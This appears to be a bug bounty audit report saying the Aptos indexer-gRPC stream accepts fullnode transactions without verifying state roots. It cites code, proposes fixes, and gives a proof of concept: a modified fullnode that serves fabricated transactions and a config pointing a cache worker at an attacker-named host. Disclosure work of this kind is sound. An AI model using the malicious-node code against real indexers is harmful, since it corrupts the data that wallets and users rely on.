# Audit Report

## Title
Missing State Root Verification in Indexer gRPC Transaction Streaming Protocol

## Summary
The Aptos indexer gRPC protocol for streaming transactions from fullnodes lacks cryptographic state root verification at the batch level and client-side implementations do not verify individual transaction state roots. This allows a malicious or compromised fullnode to serve fabricated transactions that will be blindly accepted, cached, and indexed by downstream consumers without any cryptographic proof verification.

## Finding Description

The `TransactionsFromNodeResponse` protocol defined in the fullnode data streaming service contains no state root hash for batch-level verification: [1](#0-0) 

The `StreamStatus` message only includes `type`, `start_version`, and `end_version` fields—critically missing any `state_checkpoint_hash` or `accumulator_root_hash` to enable cryptographic verification of the transaction batch against a trusted ledger state.

While individual transactions do contain `TransactionInfo` with `state_checkpoint_hash` and `accumulator_root_hash` fields: [2](#0-1) 

**Client implementations do NOT verify these hashes.** The cache worker processes transactions without any verification: [3](#0-2) 

The `process_transactions_from_node_response` function only extracts transaction data, logs metrics, and updates the cache—**no state root verification occurs**. Similarly, the data manager accepts transactions without verification: [4](#0-3) 

When receiving transaction data, it directly puts transactions into cache or returns them to clients **without any cryptographic verification**.

**Contrast with Proper Verification:** The state sync system DOES verify transaction batches correctly using `StateSyncChunkVerifier`: [5](#0-4) 

This verifier uses `TransactionInfoListWithProof.verify_extends_ledger()` to cryptographically verify that transactions extend the parent accumulator with correct root hashes and match the ledger info. **The indexer-grpc clients have no equivalent verification.**

Confirmation that indexer-grpc clients lack any trusted state or ledger info verification: [6](#0-5) 

The `verify_fullnode_init_signal` only checks chain ID and version matching—**no TrustedState or LedgerInfoWithSignatures verification exists**.

**Attack Scenario:**

1. Attacker compromises a fullnode or operates a malicious fullnode
2. Indexer components (cache-worker, data-manager) connect to this fullnode via the configured `fullnode_grpc_address`
3. Malicious fullnode sends `TransactionsFromNodeResponse` with:
   - Correct `chain_id` (easily obtained)
   - Sequential `version` numbers (trivial to maintain)
   - **Fabricated transaction content with incorrect state roots**
4. Clients accept these transactions without verifying `state_checkpoint_hash` or `accumulator_root_hash` against any trusted ledger info
5. Incorrect data flows to Redis cache and PostgreSQL indexer databases
6. Applications, wallets, and explorers consume corrupted blockchain data

## Impact Explanation

This vulnerability qualifies as **HIGH severity** per Aptos bug bounty criteria:

- **Significant Protocol Violation**: Breaks the critical invariant "State transitions must be atomic and verifiable via Merkle proofs" by accepting unverified state
- **State Inconsistencies**: Causes indexer databases to contain fabricated transactions, balances, and events
- **Data Integrity Compromise**: Applications relying on indexer data (wallets, explorers, DeFi protocols) will display incorrect information
- **User Harm**: Users see wrong balances, missing transactions, or fabricated NFT ownership data
- **Trust Erosion**: Undermines confidence in the Aptos blockchain data infrastructure

While this does not directly compromise consensus or validator operation (validators use properly verified state sync), it affects the entire ecosystem of applications and users depending on indexed data.

## Likelihood Explanation

**Likelihood: MEDIUM to HIGH**

**Attack Requirements:**
- Attacker must run or compromise a fullnode (moderate barrier)
- Indexer operators must configure their services to connect to the malicious fullnode (requires social engineering or configuration hijacking)

**Mitigating Factors:**
- Most production indexers connect to trusted fullnode operators
- Multiple redundant fullnodes can provide consistency checks (though this is not cryptographic verification)

**Aggravating Factors:**
- No cryptographic verification mechanism exists, so detection requires manual comparison
- Once malicious data enters the cache/database, it propagates to all downstream consumers
- The protocol design makes this vulnerability inherent, not implementation-specific

## Recommendation

**Immediate Fix: Add Batch-Level State Root Verification**

1. **Extend the Protocol Buffer Definition** to include accumulator root hash in `StreamStatus`:

```protobuf
message StreamStatus {
  enum StatusType {
    STATUS_TYPE_UNSPECIFIED = 0;
    STATUS_TYPE_INIT = 1;
    STATUS_TYPE_BATCH_END = 2;
  }
  StatusType type = 1;
  uint64 start_version = 2;
  optional uint64 end_version = 3 [jstype = JS_STRING];
  // ADD THESE FIELDS:
  bytes accumulator_root_hash = 4;  // Root hash at end_version
  bytes state_checkpoint_hash = 5;   // Optional, only at checkpoints
}
```

2. **Implement Client-Side Verification** in cache-worker and data-manager:

```rust
// Add to verify_fullnode_init_signal or create new verification function
async fn verify_batch_state_roots(
    transactions: &[Transaction],
    status: &StreamStatus,
    trusted_ledger_info: &LedgerInfoWithSignatures,
) -> Result<()> {
    // Extract transaction infos
    let txn_infos: Vec<TransactionInfo> = transactions
        .iter()
        .filter_map(|t| t.info.as_ref())
        .cloned()
        .collect();
    
    // Verify accumulator root hash matches
    let computed_root = compute_transaction_accumulator_root(&txn_infos)?;
    ensure!(
        computed_root == status.accumulator_root_hash,
        "Accumulator root hash mismatch"
    );
    
    // Verify against trusted ledger info
    ensure!(
        status.end_version <= trusted_ledger_info.ledger_info().version(),
        "Batch version exceeds trusted ledger info"
    );
    
    // Use TransactionInfoListWithProof.verify() pattern
    // to verify batch extends trusted state
    
    Ok(())
}
```

3. **Establish Trusted State Tracking** in indexer clients:

```rust
struct VerifiedState {
    ledger_info: LedgerInfoWithSignatures,
    version: u64,
}

// Update trusted state when receiving verified batches
// Use EpochChangeProof for epoch transitions
```

**Long-Term Fix:**

- Implement full `TrustedState` verification like state-sync does
- Require fullnodes to provide `TransactionInfoListWithProof` with accumulator proofs
- Add periodic ledger info validation against multiple trusted sources
- Implement cryptographic verification before caching any transaction data

## Proof of Concept

**Step 1: Create Malicious Fullnode Server**

```rust
// Modified fullnode_data_service.rs - malicious version
async fn get_transactions_from_node(
    &self,
    req: Request<GetTransactionsFromNodeRequest>,
) -> Result<Response<Self::GetTransactionsFromNodeStream>, Status> {
    // ... normal setup code ...
    
    tokio::spawn(async move {
        // Send init normally
        let init_status = get_status(StatusType::Init, starting_version, None, ledger_chain_id);
        tx.send(Result::<_, Status>::Ok(init_status)).await?;
        
        // Send FABRICATED transactions
        let mut fabricated_txns = vec![];
        for version in starting_version..starting_version + 100 {
            let mut txn = Transaction::default();
            txn.version = version;
            // Create fake TransactionInfo with incorrect state_checkpoint_hash
            let mut info = TransactionInfo::default();
            info.state_checkpoint_hash = Some(vec![0xFF; 32]); // WRONG HASH
            info.accumulator_root_hash = vec![0xFF; 32]; // WRONG HASH
            txn.info = Some(info);
            fabricated_txns.push(txn);
        }
        
        // Send fabricated batch
        let data_response = TransactionsFromNodeResponse {
            response: Some(transactions_from_node_response::Response::Data(
                TransactionsOutput {
                    transactions: fabricated_txns,
                }
            )),
            chain_id: ledger_chain_id as u32,
        };
        tx.send(Result::<_, Status>::Ok(data_response)).await?;
        
        // Send batch end - NO STATE ROOT VERIFICATION WILL OCCUR
        let batch_end = get_status(
            StatusType::BatchEnd,
            starting_version,
            Some(starting_version + 99),
            ledger_chain_id,
        );
        tx.send(Result::<_, Status>::Ok(batch_end)).await?;
    });
    
    Ok(Response::new(Box::pin(output_stream)))
}
```

**Step 2: Configure Cache Worker to Connect to Malicious Fullnode**

```yaml
# cache-worker-config.yaml
fullnode_grpc_address: "http://malicious-fullnode.attacker.com:50051"
redis_main_instance_address: "redis://localhost:6379"
```

**Step 3: Run Cache Worker**

```bash
cargo run --bin indexer-grpc-cache-worker -- --config cache-worker-config.yaml
```

**Expected Result:** Cache worker will accept and cache the fabricated transactions without any error, because:
- Chain ID matches
- Versions are sequential
- No state root verification occurs

**Step 4: Verify Corruption**

```bash
# Query Redis cache - will contain fabricated transactions
redis-cli GET "txn:${VERSION}"

# Shows transaction with incorrect state_checkpoint_hash (0xFF...)
# which would never match the actual blockchain state root
```

This demonstrates that the indexer-grpc protocol lacks the fundamental security property of cryptographic state verification that exists in the consensus and state-sync systems.

---

**Notes**

The vulnerability stems from a protocol design decision where transaction streaming for indexing purposes was decoupled from the rigorous cryptographic verification used in consensus and state sync. While this may have been done for performance reasons, it creates a critical security gap where data integrity depends solely on trusting the fullnode operator rather than cryptographic proofs.

### Citations

**File:** protos/proto/aptos/internal/fullnode/v1/fullnode_data.proto (L22-35)
```text
message StreamStatus {
  enum StatusType {
    STATUS_TYPE_UNSPECIFIED = 0;
    // Signal for the start of the stream.
    STATUS_TYPE_INIT = 1;
    // Signal for the end of the batch.
    STATUS_TYPE_BATCH_END = 2;
  }
  StatusType type = 1;
  // Required. Start version of current batch/stream, inclusive.
  uint64 start_version = 2;
  // End version of current *batch*, inclusive.
  optional uint64 end_version = 3 [jstype = JS_STRING];
}
```

**File:** protos/rust/src/pb/aptos.transaction.v1.rs (L308-327)
```rust
pub struct TransactionInfo {
    #[prost(bytes="vec", tag="1")]
    pub hash: ::prost::alloc::vec::Vec<u8>,
    #[prost(bytes="vec", tag="2")]
    pub state_change_hash: ::prost::alloc::vec::Vec<u8>,
    #[prost(bytes="vec", tag="3")]
    pub event_root_hash: ::prost::alloc::vec::Vec<u8>,
    #[prost(bytes="vec", optional, tag="4")]
    pub state_checkpoint_hash: ::core::option::Option<::prost::alloc::vec::Vec<u8>>,
    #[prost(uint64, tag="5")]
    pub gas_used: u64,
    #[prost(bool, tag="6")]
    pub success: bool,
    #[prost(string, tag="7")]
    pub vm_status: ::prost::alloc::string::String,
    #[prost(bytes="vec", tag="8")]
    pub accumulator_root_hash: ::prost::alloc::vec::Vec<u8>,
    #[prost(message, repeated, tag="9")]
    pub changes: ::prost::alloc::vec::Vec<WriteSetChange>,
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-cache-worker/src/worker.rs (L183-283)
```rust
async fn process_transactions_from_node_response(
    response: TransactionsFromNodeResponse,
    cache_operator: &mut CacheOperator<redis::aio::ConnectionManager>,
    download_start_time: std::time::Instant,
) -> Result<GrpcDataStatus> {
    let size_in_bytes = response.encoded_len();
    match response.response.unwrap() {
        Response::Status(status) => {
            match StatusType::try_from(status.r#type).expect("[Indexer Cache] Invalid status type.")
            {
                StatusType::Init => Ok(GrpcDataStatus::StreamInit(status.start_version)),
                StatusType::BatchEnd => {
                    let start_version = status.start_version;
                    let num_of_transactions = status
                        .end_version
                        .expect("TransactionsFromNodeResponse status end_version is None")
                        - start_version
                        + 1;
                    Ok(GrpcDataStatus::BatchEnd {
                        start_version,
                        num_of_transactions,
                    })
                },
                StatusType::Unspecified => unreachable!("Unspecified status type."),
            }
        },
        Response::Data(data) => {
            let transaction_len = data.transactions.len();
            let data_download_duration_in_secs = download_start_time.elapsed().as_secs_f64();
            let mut cache_operator_clone = cache_operator.clone();
            let task: JoinHandle<anyhow::Result<()>> = tokio::spawn({
                let first_transaction = data
                    .transactions
                    .first()
                    .context("There were unexpectedly no transactions in the response")?;
                let first_transaction_version = first_transaction.version;
                let last_transaction = data
                    .transactions
                    .last()
                    .context("There were unexpectedly no transactions in the response")?;
                let last_transaction_version = last_transaction.version;
                let start_version = first_transaction.version;
                let first_transaction_pb_timestamp = first_transaction.timestamp;
                let last_transaction_pb_timestamp = last_transaction.timestamp;

                log_grpc_step(
                    SERVICE_TYPE,
                    IndexerGrpcStep::CacheWorkerReceivedTxns,
                    Some(start_version as i64),
                    Some(last_transaction_version as i64),
                    first_transaction_pb_timestamp.as_ref(),
                    last_transaction_pb_timestamp.as_ref(),
                    Some(data_download_duration_in_secs),
                    Some(size_in_bytes),
                    Some((last_transaction_version + 1 - first_transaction_version) as i64),
                    None,
                );

                let cache_update_start_time = std::time::Instant::now();

                async move {
                    // Push to cache.
                    match cache_operator_clone
                        .update_cache_transactions(data.transactions)
                        .await
                    {
                        Ok(_) => {
                            log_grpc_step(
                                SERVICE_TYPE,
                                IndexerGrpcStep::CacheWorkerTxnsProcessed,
                                Some(first_transaction_version as i64),
                                Some(last_transaction_version as i64),
                                first_transaction_pb_timestamp.as_ref(),
                                last_transaction_pb_timestamp.as_ref(),
                                Some(cache_update_start_time.elapsed().as_secs_f64()),
                                Some(size_in_bytes),
                                Some(
                                    (last_transaction_version + 1 - first_transaction_version)
                                        as i64,
                                ),
                                None,
                            );
                            Ok(())
                        },
                        Err(e) => {
                            ERROR_COUNT
                                .with_label_values(&["failed_to_update_cache_version"])
                                .inc();
                            bail!("Update cache with version failed: {}", e);
                        },
                    }
                }
            });

            Ok(GrpcDataStatus::ChunkDataOk {
                num_of_transactions: transaction_len as u64,
                task,
            })
        },
    }
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-cache-worker/src/worker.rs (L286-325)
```rust
async fn verify_fullnode_init_signal(
    cache_operator: &mut CacheOperator<redis::aio::ConnectionManager>,
    init_signal: TransactionsFromNodeResponse,
    file_store_metadata: FileStoreMetadata,
) -> Result<(ChainID, StartingVersion)> {
    let (fullnode_chain_id, starting_version) = match init_signal
        .response
        .expect("[Indexer Cache] Response type does not exist.")
    {
        Response::Status(status_frame) => {
            match StatusType::try_from(status_frame.r#type)
                .expect("[Indexer Cache] Invalid status type.")
            {
                StatusType::Init => (init_signal.chain_id, status_frame.start_version),
                _ => {
                    bail!("[Indexer Cache] Streaming error: first frame is not INIT signal.");
                },
            }
        },
        _ => {
            bail!("[Indexer Cache] Streaming error: first frame is not siganl frame.");
        },
    };

    // Guaranteed that chain id is here at this point because we already ensure that fileworker did the set up
    let chain_id = cache_operator.get_chain_id().await?.unwrap();
    if chain_id != fullnode_chain_id as u64 {
        bail!("[Indexer Cache] Chain ID mismatch between fullnode init signal and cache.");
    }

    // It's required to start the worker with the same version as file store.
    if file_store_metadata.version != starting_version {
        bail!("[Indexer Cache] Starting version mismatch between filestore metadata and fullnode init signal.");
    }
    if file_store_metadata.chain_id != fullnode_chain_id as u64 {
        bail!("[Indexer Cache] Chain id mismatch between filestore metadata and fullnode.");
    }

    Ok((fullnode_chain_id, starting_version))
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/data_manager.rs (L257-282)
```rust
                match response_item {
                    Ok(r) => {
                        if let Some(response) = r.response {
                            match response {
                                Response::Data(data) => {
                                    trace!(
                                        "Putting data into cache, {} transaction(s).",
                                        data.transactions.len()
                                    );
                                    self.cache.write().await.put_transactions(data.transactions);
                                },
                                Response::Status(_) => continue,
                            }
                        } else {
                            warn!("Error when getting transactions from fullnode: no data.");
                            continue 'out;
                        }
                    },
                    Err(e) => {
                        warn!("Error when getting transactions from fullnode: {}", e);
                        continue 'out;
                    },
                }
            }
        }
    }
```

**File:** execution/executor/src/chunk_executor/chunk_result_verifier.rs (L36-66)
```rust
impl ChunkResultVerifier for StateSyncChunkVerifier {
    fn verify_chunk_result(
        &self,
        parent_accumulator: &InMemoryTransactionAccumulator,
        ledger_update_output: &LedgerUpdateOutput,
    ) -> Result<()> {
        // In consensus-only mode, we cannot verify the proof against the executed output,
        // because the proof returned by the remote peer is an empty one.
        if cfg!(feature = "consensus-only-perf-test") {
            return Ok(());
        }

        THREAD_MANAGER.get_exe_cpu_pool().install(|| {
            let first_version = parent_accumulator.num_leaves();

            // Verify the chunk extends the parent accumulator.
            let parent_root_hash = parent_accumulator.root_hash();
            let num_overlap = self.txn_infos_with_proof.verify_extends_ledger(
                first_version,
                parent_root_hash,
                Some(first_version),
            )?;
            assert_eq!(num_overlap, 0, "overlapped chunks");

            // Verify transaction infos match
            ledger_update_output
                .ensure_transaction_infos_match(&self.txn_infos_with_proof.transaction_infos)?;

            Ok(())
        })
    }
```
